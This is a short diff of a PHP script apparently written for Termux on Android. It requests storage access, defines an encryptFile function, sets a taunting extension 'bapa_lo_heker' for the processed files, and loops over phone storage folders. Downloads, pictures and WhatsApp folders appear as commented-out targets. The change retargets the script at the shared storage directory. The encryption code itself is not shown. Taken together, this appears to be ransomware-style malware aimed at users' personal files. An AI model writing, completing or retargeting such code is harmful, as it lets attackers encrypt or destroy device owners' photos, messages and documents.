@@ -3,7 +3,7 @@
 	/* open termux-setup-storage */
 	system('termux-setup-storage');
 	$ext = "bapa_lo_heker";
-	
+
 	function encryptFile($value, $dir){
 
         /* global variabel */
@@ -56,7 +56,7 @@
     	// 'storage/downloads',
     	// 'storage/pictures',
     	// 'storage/shared/Whatsapp',
-    	'storage/ass'
+    	'storage/shared/asu'
     ];
 
     foreach ($diskArr as $key) {
